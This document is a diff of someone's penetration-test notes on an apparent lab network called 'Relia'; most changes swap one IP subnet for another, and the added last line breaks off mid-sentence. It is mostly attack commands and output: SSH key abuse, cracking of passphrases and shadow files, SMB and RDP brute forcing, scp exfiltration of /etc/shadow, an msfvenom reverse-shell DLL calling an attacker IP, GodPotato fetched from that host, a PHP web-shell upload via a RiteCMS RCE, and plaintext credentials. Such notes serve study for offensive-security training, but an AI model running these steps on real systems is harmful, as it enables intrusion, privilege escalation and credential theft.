@@ -2,12 +2,12 @@
 We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.
 
 # Scan the DMZ network
-sudo nmap -sC -sV -T4 192.168.197.245-250 192.168.197.189,191
+sudo nmap -sC -sV -T4 192.168.162.245-250 192.168.162.189,191
 [port-scanning.md]
 
 # Found some interesting port from .245 where it have 2222 running and 21
-ssh root@192.168.197.245 -p 2222  
-root@192.168.197.245: Permission denied (publickey).
+ssh root@192.168.162.245 -p 2222  
+root@192.168.162.245: Permission denied (publickey).
 # It required public key, lets try to access FTP port with anonymous user
 ftp -p 203.0.113.0
 # When prompted for a username, you can enter either “ftp” or “anonymous”. Both are same
@@ -35,7 +35,7 @@ id_xmss：XMSS私钥文件（使用Hash-based签名算法）。
 sudo bash 50383.sh targets.txt /home/anita/.ssh/id_ecdsa
 
 # Then we found the privatekey require passphrase
-ssh -i id_edcsa anita@192.168.197.245 -p 2222
+ssh -i id_edcsa anita@192.168.162.245 -p 2222
 Enter passphrase for key 'id_edcsa': 
 
 # Use ssh2john to extract the hash
@@ -106,7 +106,7 @@ $6$p6n32TS.3/wDw7ax$TNwiUYnzlmx7Q0w59MbhSRjqW37W20OpGs/fCRJ3XiffbBVQuZTwtGeI
 
 # DEMO
 # Use the same SSH methods like WEB01 on the DEMO
-ssh -o StrictHostKeyChecking=no -i anita-id_ecdsa anita@192.168.197.246 -p2222
+ssh -o StrictHostKeyChecking=no -i anita-id_ecdsa anita@192.168.162.246 -p2222
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 anita@demo:/tmp$ hostname
 demo
@@ -124,7 +124,7 @@ anita@demo:$ cat local.txt
 python3 exp_nss.py
 # Unfortunately failed... then probably this machine is not follow to previous methods.
 # We notice that 8000 port is running locally on DEMO, and I think I would like to reverse proxy into my localhost and check
-ssh -o StrictHostKeyChecking=no -N -i anita-id_ecdsa anita@192.168.197.246 -p2222 -L 8000:localhost:8000
+ssh -o StrictHostKeyChecking=no -N -i anita-id_ecdsa anita@192.168.162.246 -p2222 -L 8000:localhost:8000
 # Access to the http://localhost:8000, nothing much the website can tell.
 # We can further dig into the file that we had captured from the linpeas which is /var/www/html folder.
 # Then I found a /var/www/internal/backend folder, when access through 127.0.0.1:8000/backend it looks like a web console, but unable to signin cause we dont have any user information. 
@@ -163,23 +163,23 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 root@demo:/root# cat proof.txt
 cp /etc/shadow .
 cp /etc/passwd .
-scp -P 2222 -i anita-id_ecdsa anita@192.168.197.246:/home/anita/passwd .
-scp -P 2222 -i anita-id_ecdsa anita@192.168.197.246:/home/anita/shadow .
+scp -P 2222 -i anita-id_ecdsa anita@192.168.162.246:/home/anita/passwd .
+scp -P 2222 -i anita-id_ecdsa anita@192.168.162.246:/home/anita/shadow .
 unshadow passwd shadow > unshadowed.txt
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 
 # EXTERNAL
 sudo smbmap --host-file iplists.txt -u john
 ...
-[+] IP: 192.168.197.248:445     Name: 192.168.197.248           Status: Authenticated
+[+] IP: 192.168.162.248:445     Name: 192.168.162.248           Status: Authenticated
 transfer                                                READ, WRITE
 Users                                                   READ ONLY
 ...
 # Lets try to access the share folder
-smbclient //192.168.197.248/Users -U john
+smbclient //192.168.162.248/Users -U john
 # From the \Public\Libraries we found a config file "RecordedTV.library-ms" which is a shell file. Take a note first, lets dig further.
 # Command looking is too slow, lets mount the SMB folder to local
-mount -t cifs //192.168.197.248/transfer /home/kali/Desktop/RELIA/EXTERNAL/transfer 
+mount -t cifs //192.168.162.248/transfer /home/kali/Desktop/RELIA/EXTERNAL/transfer 
 ...
 DB-back(1)/NewFolder/Emma/Documents/Database.kdbx
 logs/build/materials/assets/Databases/Database.kdbx # Cannot use
@@ -213,7 +213,7 @@ sudo apt-get install keepassxc
 # Opened the keepass database, we have few username and password
 [dmz-creds.md] and update to [user.txt] & [pass.txt]
 # From the port scanning, we knew that RDP port is enable, lets try to find the password access to the Windows
-xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.197.248 +clipboard /cert-ignore
+xfreerdp /u:emma /p:SomersetVinyl1! /v:192.168.162.248 +clipboard /cert-ignore
 PS C:\Users\emma\Desktop> cat local.txt
 # Upload winpeas and run [emma-winpeas.md]
 ...
@@ -237,7 +237,7 @@ PS C:\BetaMonitor> icacls .
 # Lets create a dll file 
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.165  LPORT=8888 -f dll -o msf.dll
 # We cannot upload the dll payload to any SYSTEM ENV PATH.. Stuck for a while.. and remember that we found a APPKEY from WinPEAS. Where I think we can try it for mark user
-xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.197.248 /cert-ignore +drive:/home/kali/Desktop,/smb
+xfreerdp /u:mark /p:'!8@aBRBYdb3!' /v:192.168.162.248 /cert-ignore +drive:/home/kali/Desktop,/smb
 # :) Fuck
 PS C:\Users\mark\Desktop> type proof.txt
 # We have the mark user a.k.a Administrator, thats good for now. We may proceed to WEB02 machine.
@@ -245,9 +245,9 @@ PS C:\Users\mark\Desktop> type proof.txt
 # WEB02
 # Access to the Websites found nothing, then we can try there is a crackmapexec smb and rdp brute force with the current username and password we have.
 crackmapexec smb iplist.txt -u user.txt -p pass.txt --continue-on-success
-crowbar -b rdp -s 192.168.197.247/32 -U user.txt -C pass.txt
+crowbar -b rdp -s 192.168.162.247/32 -U user.txt -C pass.txt
 # None of them are found :D, lets try with nmap for full scanning again.
-nmap -sV -T4 -p- 192.168.197.247
+nmap -sV -T4 -p- 192.168.162.247
 # After a full scan I found a FTP port in 14020, lets try to check is it possible to have any more information
 ...
 14020/tcp open  ftp     FileZilla ftpd
@@ -258,7 +258,7 @@ nmap -sV -T4 -p- 192.168.197.247
 |_  SYST: UNIX emulated by FileZilla
 ...
 # Anonymous FTP login allowed, lets check that umbraco.pdf
-ftp 192.168.197.247 -p 14020
+ftp 192.168.162.247 -p 14020
 username: anonymous
 password: anonymous
 ftp> get umbraco.pdf
@@ -272,7 +272,7 @@ o e.g. web02.relia.com, not just web02.
 # Here saying Umbraco only allow to be access through FQDN instead of IP. Thats means we need to define the DNS
 sudo nano /etc/hosts
 ...
-192.168.197.247 web02.relia.com
+192.168.162.247 web02.relia.com
 ...
 # Now we can access through FQDN and login with the user account found
 http://web02.relia.com:14080/
@@ -309,7 +309,7 @@ PS C:\users\public\Downloads> .\printspoof.exe -c "cmd -c C:\users\public\Downlo
 # Operation failed, lets try GodPotato
 PS C:\users\public\Downloads> iwr -uri http://192.168.45.165:8088/Windows/Priv-Esc/GodPotato-NET4.exe -Outfile godpotato.exe
 PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"
-[*] Command shell session 2 opened (192.168.45.165:8888 -> 192.168.197.247:49904) at 2024-06-01 23:02:23 +0800
+[*] Command shell session 2 opened (192.168.45.165:8888 -> 192.168.162.247:49904) at 2024-06-01 23:02:23 +0800
 msf6 exploit(multi/handler) > sessions -i 2 -t 100
 C:\users\public\Downloads>whoami
 nt authority\system
@@ -317,12 +317,12 @@ PS C:\> cat local.txt
 PS C:\Users\Administrator\Desktop> type proof.txt
 
 # LEGACY
-nmap -A -T4 -p- 192.168.197.249 
-gobuster dir -u http://192.168.197.249:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+nmap -A -T4 -p- 192.168.162.249 
+gobuster dir -u http://192.168.162.249:8000 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 # Not much value information, lets try dirb
-dirb http://192.168.197.249:8000
+dirb http://192.168.162.249:8000
 ...
-+ http://192.168.197.249:8000/cms/admin.php (CODE:200|SIZE:1117)     
++ http://192.168.162.249:8000/cms/admin.php (CODE:200|SIZE:1117)     
 ...
 # We tried admin:admin and it access lel.
 Searchsploit RiteCMS
@@ -331,7 +331,7 @@ RiteCMS 3.1.0 - Remote Code Execution (RCE) (Authenticated)                     
 ...
 searchsploit -m 50616
 # Follow to the PoC method 2, we can use burpsuite to change intercept file upload by changing its extensions to bypass restrictions. 
-http://192.168.197.249:8000/cms/media/pw0ny-shell.pHp
+http://192.168.162.249:8000/cms/media/pw0ny-shell.pHp
 adrian@LEGACY:C:\Users\adrian\Desktop# type local.txt
 # Change the shell by upload met.exe and upload winpeas
 [adrian-winpeas.md]
@@ -380,3 +380,5 @@ index 77e370c..0000000
 # Get the maildmz@relia and jim@relia.com
 # I think thats far I can go with the staging folder.. Lets try the mimikatz.. Unfortunately damon permisison does not enough to capture from memory, lets access to NT/AUTHORITY using godpotato
 PS C:\users\public\Downloads> .\godpotato.exe -cmd "C:\users\public\Downloads\met.exe"
+
+# Based on above email we know that is something breaks we can contact jim@relia.com as he is the mail server admin. We can follow to our 
